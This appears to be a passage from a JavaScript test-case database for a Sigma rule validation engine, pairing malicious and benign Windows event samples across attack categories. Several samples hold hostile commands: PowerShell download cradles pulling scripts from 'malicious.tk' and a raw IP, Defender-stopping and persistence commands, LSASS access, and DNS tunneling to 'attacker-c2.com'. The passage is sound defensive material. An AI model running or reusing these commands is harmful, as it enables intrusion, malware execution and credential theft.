// ============================================================
// DETECTION TESTING & VALIDATION ENGINE — SigmaGuard SOP
// Covers all 22 attack categories | All Sigma rules
// Positive + Negative test cases | Splunk + QRadar validation
// ============================================================
'use strict';

// ── Status / Type Constants ──────────────────────────────────
const VALIDATION_STATUS = { PASSED:'passed', FAILED:'failed', NEEDS_REVIEW:'needs_review', NOT_TESTED:'not_tested' };
const TEST_TYPE = { POSITIVE:'positive', NEGATIVE:'negative' };
const VALIDATION_STORAGE_KEY = 'sigmaguard_validation_v3';

// ══════════════════════════════════════════════════════════════
// TEST CASE DATABASE — Explicit cases for key rules across all categories
// ══════════════════════════════════════════════════════════════
const DETECTION_TEST_CASES = {

// ━━━ EMAIL THREATS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0001': [
  { id:'TC-SR0001-POS-1', type:'positive', name:'Outlook spawns PowerShell (phishing attachment)',
    description:'User opens malicious Office macro that spawns PowerShell with bypass flags — most common phishing payload chain.',
    input:{ eventId:1, logSource:'Sysmon (Process Creation)', sourceIp:'10.0.4.55', destIp:'N/A',
      user:'jsmith@corp.local', parentImage:'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE',
      image:'C:\\Windows\\System32\\powershell.exe',
      commandLine:'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0A...',
      additionalFields:{ WorkingDirectory:'C:\\Users\\jsmith\\AppData\\Local\\Temp\\', IntegrityLevel:'Medium' }},
    expectedOutput:{ triggered:true, category:'email-threats', mitreMapping:'T1566.001', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0001',
      notes:'ParentImage(Outlook) + ChildImage(powershell) pattern matched' }},
  { id:'TC-SR0001-NEG-1', type:'negative', name:'Outlook opens Chrome browser — benign link click',
    description:'User clicks a legitimate SharePoint link in email; Chrome is launched. This is normal and should NOT trigger.',
    input:{ eventId:1, logSource:'Sysmon', sourceIp:'10.0.4.55', user:'jsmith@corp.local',
      parentImage:'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE',
      image:'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      commandLine:'chrome.exe https://sharepoint.corp.local/projects', additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'chrome.exe is not in suspicious child process list (cmd/powershell/wscript/cscript/mshta/regsvr32/rundll32)' }},
  { id:'TC-SR0001-POS-2', type:'positive', name:'Thunderbird spawns mshta.exe via malicious HTA',
    description:'Thunderbird email client spawns mshta.exe when user opens malicious .hta attachment.',
    input:{ eventId:1, logSource:'Sysmon', user:'alice.jones',
      parentImage:'C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe',
      image:'C:\\Windows\\System32\\mshta.exe',
      commandLine:'mshta.exe C:\\Users\\alice\\AppData\\Local\\Temp\\invoice_Q4.hta', additionalFields:{}},
    expectedOutput:{ triggered:true, category:'email-threats', mitreMapping:'T1566.001', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true }}],

'SR-0002': [
  { id:'TC-SR0002-POS-1', type:'positive', name:'Chrome spawns PowerShell download cradle after phishing link',
    description:'User clicks phishing link from email; Chrome spawns PowerShell with IEX DownloadString.',
    input:{ eventId:1, logSource:'Sysmon', user:'bob.martin',
      parentImage:'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      image:'C:\\Windows\\System32\\powershell.exe',
      commandLine:'powershell.exe -nop -c "IEX ((New-Object Net.WebClient).DownloadString(\'http://malicious.tk/payload.ps1\'))"',
      additionalFields:{}},
    expectedOutput:{ triggered:true, category:'email-threats', mitreMapping:'T1566.002', severity:'medium',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0002' }},
  { id:'TC-SR0002-NEG-1', type:'negative', name:'Chrome spawns Adobe Reader for PDF — benign',
    description:'User clicks a link to open a PDF from a legitimate site; AcroRd32.exe launches. Not suspicious.',
    input:{ eventId:1, logSource:'Sysmon',
      parentImage:'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      image:'C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe',
      commandLine:'AcroRd32.exe "C:\\Users\\bob\\Downloads\\report.pdf"', additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'Adobe Reader is not in suspicious child list; no download URL in commandline' }}],

// ━━━ WEB ATTACKS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0003': [
  { id:'TC-SR0003-POS-1', type:'positive', name:'IIS w3wp.exe spawns cmd.exe — webshell/RCE exploit',
    description:'Web server process spawns cmd.exe — strong indicator of webshell upload or RCE exploit execution.',
    input:{ eventId:1, logSource:'Sysmon', sourceIp:'203.0.113.55', destIp:'10.10.10.80',
      user:'IIS APPPOOL\\DefaultAppPool',
      parentImage:'C:\\Windows\\System32\\inetsrv\\w3wp.exe',
      image:'C:\\Windows\\System32\\cmd.exe',
      commandLine:'cmd.exe /c whoami',
      additionalFields:{ IntegrityLevel:'High' }},
    expectedOutput:{ triggered:true, category:'web-attacks', mitreMapping:'T1190', severity:'critical',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0003' }},
  { id:'TC-SR0003-POS-2', type:'positive', name:'Apache httpd.exe spawns PowerShell — server-side RCE',
    description:'Apache spawning PowerShell indicates a server-side injection or deserialization exploit.',
    input:{ eventId:1, logSource:'Sysmon',
      parentImage:'C:\\Apache24\\bin\\httpd.exe',
      image:'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      commandLine:'powershell.exe -nop -enc SQBFAFgA...', additionalFields:{}},
    expectedOutput:{ triggered:true, category:'web-attacks', mitreMapping:'T1190', severity:'critical',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true }},
  { id:'TC-SR0003-NEG-1', type:'negative', name:'w3wp.exe spawns aspnet_compiler.exe — legitimate ASP.NET',
    description:'IIS application pool spawns aspnet_compiler.exe during normal app initialization.',
    input:{ eventId:1, logSource:'Sysmon',
      parentImage:'C:\\Windows\\System32\\inetsrv\\w3wp.exe',
      image:'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe',
      commandLine:'aspnet_compiler.exe -v / -p C:\\inetpub\\wwwroot', additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'aspnet_compiler.exe is a legitimate .NET tool, not in suspicious child list (cmd/powershell/whoami/net/nltest/certutil)' }}],

// ━━━ BRUTE FORCE / INITIAL ACCESS ━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0004': [
  { id:'TC-SR0004-POS-1', type:'positive', name:'20 failed logins from external IP — VPN brute force',
    description:'Classic VPN brute force: 20 EventID 4625 failures from same external IP in 30 minutes.',
    input:{ eventId:4625, logSource:'Windows Security', sourceIp:'185.220.101.34', destIp:'10.0.0.5',
      user:'various (credential spray)', logonType:3, failureCount:20, timeWindow:'30 minutes',
      additionalFields:{ LogonType:3, FailureReason:'%%2313', IpAddress:'185.220.101.34' }},
    expectedOutput:{ triggered:true, category:'brute-force', mitreMapping:'T1133', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0004',
      notes:'Threshold: >10 failures from non-RFC1918 IP in 5-minute window' }},
  { id:'TC-SR0004-NEG-1', type:'negative', name:'Single failed login from internal help desk — mistyped password',
    description:'One 4625 event from internal RFC1918 IP — presumably a mistyped password. Should not trigger.',
    input:{ eventId:4625, logSource:'Windows Security', sourceIp:'192.168.10.20',
      failureCount:1, logonType:3, additionalFields:{ IpAddress:'192.168.10.20' }},
    expectedOutput:{ triggered:false, reason:'RFC1918 source IP + count=1 below threshold of 10 — filter_local excludes internal IPs' }},
  { id:'TC-SR0004-POS-2', type:'positive', name:'Password spray: 50 accounts from Tor exit node',
    description:'Coordinated password spray from Tor exit node targeting 50 different accounts in 60 minutes.',
    input:{ eventId:4625, logSource:'Windows Security', sourceIp:'45.155.205.233',
      failureCount:50, uniqueAccounts:50, logonType:10, timeWindow:'60 minutes',
      additionalFields:{ IpAddress:'45.155.205.233', LogonType:10 }},
    expectedOutput:{ triggered:true, category:'brute-force', mitreMapping:'T1133', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true }}],

// ━━━ INSIDER THREAT ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0005': [
  { id:'TC-SR0005-POS-1', type:'positive', name:'Interactive login at 02:30 from external IP',
    description:'Employee account logs in interactively at 2:30 AM from an external IP — potential insider threat or compromised credentials.',
    input:{ eventId:4624, logSource:'Windows Security', user:'CORP\\jdoe',
      logonType:2, loginTime:'02:30:00', sourceIp:'203.0.113.77',
      additionalFields:{ LogonType:2, EventID:4624, Hour:2 }},
    expectedOutput:{ triggered:true, category:'insider-threat', mitreMapping:'T1078', severity:'medium',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0005' }},
  { id:'TC-SR0005-NEG-1', type:'negative', name:'Service account network logon at 03:00 — scheduled job',
    description:'Service account logs on via network (LogonType 3) at 3 AM for scheduled backup. Filtered by svc_ prefix.',
    input:{ eventId:4624, logSource:'Windows Security', user:'svc_backup',
      logonType:3, loginTime:'03:00:00', additionalFields:{ LogonType:3, TargetUserName:'svc_backup' }},
    expectedOutput:{ triggered:false, reason:'svc_ prefix excluded by filter_service_accounts; LogonType=3 (network) not interactive' }}],

// ━━━ EXECUTION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0006': [
  { id:'TC-SR0006-POS-1', type:'positive', name:'PowerShell with Base64 encoded payload + bypass flags',
    description:'Classic malware delivery: PowerShell with -EncodedCommand, -ExecutionPolicy Bypass, and -WindowStyle Hidden.',
    input:{ eventId:1, logSource:'Sysmon', user:'mike.chen',
      image:'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      commandLine:'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0A...',
      additionalFields:{ IntegrityLevel:'Medium' }},
    expectedOutput:{ triggered:true, category:'execution', mitreMapping:'T1059.001', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0006' }},
  { id:'TC-SR0006-NEG-1', type:'negative', name:'PowerShell running a signed admin inventory script',
    description:'IT admin runs a signed PowerShell script from Program Files with no obfuscation or bypass.',
    input:{ eventId:1, logSource:'Sysmon', user:'sysadmin',
      image:'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      commandLine:'powershell.exe -File "C:\\Program Files\\IT Tools\\Get-Inventory.ps1"',
      additionalFields:{ IntegrityLevel:'High' }},
    expectedOutput:{ triggered:false, reason:'No encoding, no bypass, no download cradle — fewer than 2 suspicious flags' }},
  { id:'TC-SR0006-POS-2', type:'positive', name:'PowerShell IEX + DownloadString — fileless payload',
    description:'Invoke-Expression downloads and executes a script from attacker C2 in memory.',
    input:{ eventId:1, logSource:'Sysmon',
      image:'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      commandLine:'powershell.exe -nop -c "IEX ((New-Object Net.WebClient).DownloadString(\'http://45.33.32.156/drop.ps1\'))"',
      additionalFields:{}},
    expectedOutput:{ triggered:true, category:'execution', mitreMapping:'T1059.001', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true }}],

'SR-0009': [
  { id:'TC-SR0009-POS-1', type:'positive', name:'Schtasks creates SYSTEM PowerShell task for persistence',
    description:'Attacker creates scheduled task running PowerShell as SYSTEM every 5 minutes.',
    input:{ eventId:4698, logSource:'Windows Security / Sysmon Event 1', user:'CORP\\jsmith',
      image:'C:\\Windows\\System32\\schtasks.exe',
      commandLine:'schtasks.exe /create /tn "WindowsUpdate" /sc MINUTE /mo 5 /ru SYSTEM /tr "powershell.exe -nop -enc JABz..."',
      additionalFields:{ EventID:4698, TaskName:'WindowsUpdate' }},
    expectedOutput:{ triggered:true, category:'persistence', mitreMapping:'T1053.005', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0009' }},
  { id:'TC-SR0009-NEG-1', type:'negative', name:'Chrome update creates scheduled task from Program Files',
    description:'GoogleUpdate legitimately creates a scheduled task pointing to C:\\Program Files. Normal.',
    input:{ eventId:4698, logSource:'Windows Security', user:'SYSTEM',
      commandLine:'schtasks.exe /create /tn "GoogleUpdateTaskMachine" /sc HOURLY /tr "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe"',
      additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'Binary in Program Files (not suspicious path) and no script interpreter in /tr' }}],

// ━━━ PERSISTENCE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0011': [
  { id:'TC-SR0011-POS-1', type:'positive', name:'Run key modified to point to malware in AppData',
    description:'Malware adds Registry Run key pointing to executable in AppData for logon persistence.',
    input:{ eventId:13, logSource:'Sysmon (Registry Set)', user:'CORP\\victim',
      targetObject:'HKU\\S-1-5-21-xxx\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost32',
      details:'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe',
      additionalFields:{ Image:'C:\\Users\\victim\\AppData\\Roaming\\svchost32.exe' }},
    expectedOutput:{ triggered:true, category:'persistence', mitreMapping:'T1547.001', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0011' }},
  { id:'TC-SR0011-NEG-1', type:'negative', name:'OneDrive adds Run key from Program Files — legitimate',
    description:'OneDrive installer creates a Run key pointing to its Program Files binary.',
    input:{ eventId:13, logSource:'Sysmon',
      targetObject:'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive',
      details:'C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe /background', additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'Details value matches Program Files path — excluded by filter_legitimate' }}],

'SR-0013': [
  { id:'TC-SR0013-POS-1', type:'positive', name:'Malicious service installed with binary in Temp directory',
    description:'Attacker installs backdoor as Windows service with binary in C:\\Windows\\Temp.',
    input:{ eventId:7045, logSource:'System Event Log', serviceName:'WinHttpProxy32',
      imagePath:'C:\\Windows\\Temp\\winhttp32.exe',
      additionalFields:{ EventID:7045, ServiceType:'Win32OwnProcess' }},
    expectedOutput:{ triggered:true, category:'persistence', mitreMapping:'T1543.003', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0013' }},
  { id:'TC-SR0013-NEG-1', type:'negative', name:'CrowdStrike Falcon service installed from Program Files',
    description:'CrowdStrike sensor installer creates its service pointing to Program Files binary.',
    input:{ eventId:7045, logSource:'System Event Log', serviceName:'CSFalconService',
      imagePath:'C:\\Program Files\\CrowdStrike\\CSFalconService.exe', additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'Binary in Program Files — not in suspicious path/cmd list' }}],

// ━━━ PRIVILEGE ESCALATION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0016': [
  { id:'TC-SR0016-POS-1', type:'positive', name:'eventvwr.exe UAC bypass — spawns elevated cmd.exe',
    description:'Classic UAC bypass via eventvwr.exe MSC file hijack; spawns cmd.exe with High integrity.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\lowpriv',
      parentImage:'C:\\Windows\\System32\\eventvwr.exe',
      image:'C:\\Windows\\System32\\cmd.exe',
      commandLine:'cmd.exe /c powershell -ep bypass',
      additionalFields:{ IntegrityLevel:'High' }},
    expectedOutput:{ triggered:true, category:'privilege-escalation', mitreMapping:'T1548.002', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0016' }},
  { id:'TC-SR0016-NEG-1', type:'negative', name:'Admin opens Event Viewer normally — no child process',
    description:'Admin opens Event Viewer directly from Start menu; no child process spawned.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\admin',
      image:'C:\\Windows\\System32\\eventvwr.exe',
      commandLine:'eventvwr.exe', additionalFields:{ IntegrityLevel:'High' }},
    expectedOutput:{ triggered:false, reason:'eventvwr is parent, not spawning suspicious child — no bypass condition met' }}],

'SR-0018': [
  { id:'TC-SR0018-POS-1', type:'positive', name:'whoami /priv + SeDebugPrivilege token manipulation',
    description:'Post-exploitation: attacker checks privileges then enables SeDebugPrivilege for token impersonation.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\compromised',
      image:'C:\\Windows\\System32\\cmd.exe',
      commandLine:'whoami /priv',
      additionalFields:{ PrivilegesUsed:'SeDebugPrivilege', Comment:'Precedes incognito token steal' }},
    expectedOutput:{ triggered:true, category:'privilege-escalation', mitreMapping:'T1134', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0018' }},
  { id:'TC-SR0018-NEG-1', type:'negative', name:'Routine whoami by sysadmin — no privilege flags',
    description:'Sysadmin runs whoami to verify context. No /priv flag or impersonation.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\sysadmin',
      image:'C:\\Windows\\System32\\whoami.exe',
      commandLine:'whoami', additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'No /priv flag, no SeDebugPrivilege, no impersonation/incognito/token keyword' }}],

// ━━━ CREDENTIAL ACCESS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0027': [
  { id:'TC-SR0027-POS-1', type:'positive', name:'Mimikatz-style LSASS access with suspicious mask',
    description:'Non-system process opens lsass.exe with access mask 0x1010 — Mimikatz sekurlsa::logonpasswords pattern.',
    input:{ eventId:10, logSource:'Sysmon (Process Access)', user:'CORP\\attacker',
      sourceImage:'C:\\Users\\attacker\\Desktop\\mimi.exe',
      targetImage:'C:\\Windows\\System32\\lsass.exe',
      grantedAccess:'0x1010',
      callTrace:'C:\\Windows\\SYSTEM32\\ntdll.dll | C:\\Users\\attacker\\Desktop\\mimi.exe',
      additionalFields:{ EventID:10, GrantedAccess:'0x1010' }},
    expectedOutput:{ triggered:true, category:'credential-access', mitreMapping:'T1003.001', severity:'critical',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0027' }},
  { id:'TC-SR0027-NEG-1', type:'negative', name:'Windows Defender (MsMpEng) accesses LSASS — legitimate',
    description:'MsMpEng.exe is an antivirus process; its access to lsass is expected security monitoring.',
    input:{ eventId:10, logSource:'Sysmon',
      sourceImage:'C:\\Program Files\\Windows Defender\\MsMpEng.exe',
      targetImage:'C:\\Windows\\System32\\lsass.exe',
      grantedAccess:'0x1478', additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'MsMpEng is allowlisted AV process — excluded by NOT filter_legitimate in Sigma rule' }}],

'SR-0028': [
  { id:'TC-SR0028-POS-1', type:'positive', name:'Kerberoasting — 5 RC4 TGS requests from single account',
    description:'Account requests 5 Kerberos TGS tickets using vulnerable RC4 (0x17) encryption — Kerberoasting IOC.',
    input:{ eventId:4769, logSource:'Windows Security (Domain Controller)', user:'CORP\\attacker',
      sourceIp:'10.0.5.22', ticketEncryptionType:'0x17', uniqueSPNs:5, timeWindow:'10 minutes',
      additionalFields:{ EventID:4769, TicketEncryptionType:'0x17', ServiceName:'MSSQLSvc/dbserver01.corp.local' }},
    expectedOutput:{ triggered:true, category:'credential-access', mitreMapping:'T1558.003', severity:'critical',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0028' }},
  { id:'TC-SR0028-NEG-1', type:'negative', name:'Normal Kerberos TGS with AES-256 encryption',
    description:'Modern Windows Kerberos authentication using AES-256 (0x12) — not Kerberoastable.',
    input:{ eventId:4769, logSource:'Windows Security', user:'CORP\\normal.user',
      ticketEncryptionType:'0x12', additionalFields:{ TicketEncryptionType:'0x12' }},
    expectedOutput:{ triggered:false, reason:'Encryption type 0x12 (AES-256) — secure modern Kerberos, not vulnerable RC4 (0x17)' }}],

// ━━━ DEFENSE EVASION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0020': [
  { id:'TC-SR0020-POS-1', type:'positive', name:'net stop WinDefend — Defender tampered pre-ransomware',
    description:'Ransomware pre-execution step: stops Windows Defender service via net.exe before encryption.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\compromised',
      image:'C:\\Windows\\System32\\net.exe', commandLine:'net stop WinDefend',
      additionalFields:{ ServiceName:'WinDefend' }},
    expectedOutput:{ triggered:true, category:'defense-evasion', mitreMapping:'T1562.001', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0020' }},
  { id:'TC-SR0020-NEG-1', type:'negative', name:'net stop Spooler — PrintNightmare mitigation',
    description:'Admin stops Print Spooler service for security hardening. Not a security tool.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\sysadmin',
      image:'C:\\Windows\\System32\\net.exe', commandLine:'net stop Spooler', additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'Spooler is not in security tool list (WinDefend/MsMpSvc/Sense/McAfee/AVP)' }}],

'SR-0021': [
  { id:'TC-SR0021-POS-1', type:'positive', name:'Security Event Log cleared — EventID 1102',
    description:'Attacker clears Security event log to erase evidence of compromise activity.',
    input:{ eventId:1102, logSource:'Windows Security', user:'CORP\\attacker', sourceIp:'10.0.5.33',
      additionalFields:{ EventID:1102, SubjectUserName:'attacker', LogName:'Security' }},
    expectedOutput:{ triggered:true, category:'defense-evasion', mitreMapping:'T1070.001', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0021' }},
  { id:'TC-SR0021-NEG-1', type:'negative', name:'Application logs an error — EventID 1000, no log clearing',
    description:'Normal application error written to Application event log. No log clearing activity.',
    input:{ eventId:1000, logSource:'Application Event Log', user:'CORP\\svc_account',
      additionalFields:{ EventID:1000, LogName:'Application' }},
    expectedOutput:{ triggered:false, reason:'EventID 1000 is not 1102 (Security log cleared) or 104 (System log cleared)' }}],

// ━━━ LATERAL MOVEMENT ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0036': [
  { id:'TC-SR0036-POS-1', type:'positive', name:'RDP logon from external IP — possible lateral movement',
    description:'Successful RDP session (LogonType 10) originating from an external non-RFC1918 IP.',
    input:{ eventId:4624, logSource:'Windows Security', user:'CORP\\admin',
      sourceIp:'198.51.100.44', destIp:'10.0.0.5', logonType:10,
      additionalFields:{ LogonType:10, EventID:4624, IpAddress:'198.51.100.44' }},
    expectedOutput:{ triggered:true, category:'lateral-movement', mitreMapping:'T1021.001', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0036' }},
  { id:'TC-SR0036-NEG-1', type:'negative', name:'IT admin RDPs from internal subnet — normal management',
    description:'IT admin RDPs from 10.0.1.x internal subnet to server. Expected management activity.',
    input:{ eventId:4624, logSource:'Windows Security', user:'CORP\\it.admin',
      sourceIp:'10.0.1.15', logonType:10, additionalFields:{ LogonType:10, IpAddress:'10.0.1.15' }},
    expectedOutput:{ triggered:false, reason:'RFC1918 source IP matches filter_local exclusion — internal management traffic' }}],

'SR-0037': [
  { id:'TC-SR0037-POS-1', type:'positive', name:'Admin share C$ access from server during off-hours',
    description:'Suspicious server-to-server access of C$ admin share — lateral tool transfer pattern.',
    input:{ eventId:5140, logSource:'Windows Security', user:'CORP\\compromised',
      sourceIp:'10.0.5.22', shareName:'\\\\FILESERVER01\\C$',
      additionalFields:{ EventID:5140, ShareName:'\\\\FILESERVER01\\C$' }},
    expectedOutput:{ triggered:true, category:'lateral-movement', mitreMapping:'T1021.002', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0037' }},
  { id:'TC-SR0037-NEG-1', type:'negative', name:'Backup agent accesses ADMIN$ — authorized Veeam backup',
    description:'Veeam backup service account accesses ADMIN$ for scheduled backup. Documented behavior.',
    input:{ eventId:5140, logSource:'Windows Security', user:'CORP\\svc_veeam',
      sourceIp:'10.0.1.50', shareName:'\\\\FILESERVER01\\ADMIN$', additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'Backup service account is allowlisted; activity matches approved backup window' }}],

// ━━━ ACTIVE DIRECTORY ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0029': [
  { id:'TC-SR0029-POS-1', type:'positive', name:'DCSync: DS-Replication from non-DC host',
    description:'Non-domain-controller requests AD replication via EventID 4662 — DCSync attack (Mimikatz/Impacket).',
    input:{ eventId:4662, logSource:'Windows Security (AD DS)', user:'CORP\\compromised_admin',
      sourceIp:'10.0.5.55', accessMask:'0x100', properties:'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',
      additionalFields:{ EventID:4662, AccessMask:'0x100', Properties:'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' }},
    expectedOutput:{ triggered:true, category:'active-directory', mitreMapping:'T1003.006', severity:'critical',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0029' }},
  { id:'TC-SR0029-NEG-1', type:'negative', name:'AD replication between domain controllers — legitimate DC sync',
    description:'Normal AD replication between DC01 and DC02. SubjectUserName ends with $ (machine account).',
    input:{ eventId:4662, logSource:'Windows Security', user:'CORP\\DC02$',
      accessMask:'0x100', properties:'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',
      additionalFields:{ SubjectUserName:'DC02$' }},
    expectedOutput:{ triggered:false, reason:'Machine account (ends with $) excluded — filter_machine_accounts in Sigma rule' }}],

// ━━━ DATA EXFILTRATION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0041': [
  { id:'TC-SR0041-POS-1', type:'positive', name:'WinRAR compresses HR confidential share — staging for exfil',
    description:'Insider threat staging: WinRAR archives files from a confidential SMB share to the Desktop.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\insider',
      image:'C:\\Program Files\\WinRAR\\WinRAR.exe',
      commandLine:'WinRAR.exe a -r C:\\Users\\insider\\Desktop\\data.rar "\\\\fileserver\\HR\\Confidential\\*"',
      additionalFields:{}},
    expectedOutput:{ triggered:true, category:'data-exfiltration', mitreMapping:'T1560.001', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0041' }},
  { id:'TC-SR0041-NEG-1', type:'negative', name:'Dev zips source code for CI/CD build — legitimate',
    description:'Developer compresses project source for a deployment pipeline. Expected development workflow.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\dev.user',
      image:'C:\\Program Files\\7-Zip\\7z.exe',
      commandLine:'7z.exe a C:\\Builds\\app_v2.3.zip C:\\Dev\\ProjectX\\src\\*', additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'Source path (C:\\Dev) is not a sensitive share path; tuning should allowlist build directories' }}],

// ━━━ COMMAND & CONTROL ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0044': [
  { id:'TC-SR0044-POS-1', type:'positive', name:'DNS tunneling — 250 queries with 65-char subdomains',
    description:'Malware exfiltrating data via DNS: 250 queries with encoded 65-char subdomains in 15 minutes.',
    input:{ eventId:22, logSource:'Sysmon (DNS Query) / DNS Server', sourceIp:'10.0.4.33',
      dnsQuery:'ZGVjb2RlZGRhdGFjaHVuazAxAAA.c2VjcmV0LmJhc2U2NA.attacker-c2.com',
      queryCount:250, avgQueryLength:65, timeWindow:'15 minutes',
      additionalFields:{ QueryName:'ZGVjb2RlZGRhdGEchunk01.attacker-c2.com', QueryType:'A' }},
    expectedOutput:{ triggered:true, category:'command-control', mitreMapping:'T1071.004', severity:'high',
      sigmaLogicMatched:true, splunkQueryReturnsMatch:true, qradarQueryReturnsMatch:true, correctRuleAssociation:'SR-0044' }},
  { id:'TC-SR0044-NEG-1', type:'negative', name:'Normal CDN DNS resolution — short queries, low volume',
    description:'Client resolves standard Microsoft CDN domains. Short labels, low volume — legitimate.',
    input:{ eventId:22, logSource:'Sysmon', sourceIp:'10.0.1.5',
      dnsQuery:'static.cloudflare.com', queryCount:10, avgQueryLength:22, additionalFields:{}},
    expectedOutput:{ triggered:false, reason:'Query length=22 and count=10 both below tunneling thresholds (>50 chars, >100 queries)' }}],

// ━━━ RECONNAISSANCE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'SR-0033': [
  { id:'TC-SR0033-POS-1', type:'positive', name:'5 rapid recon commands in 5 minutes — post-exploitation',
    description:'Post-exploitation recon chain: whoami, systeminfo, ipconfig, net user/domain, nltest executed rapidly.',
    input:{ eventId:1, logSource:'Sysmon', user:'CORP\\compromised',
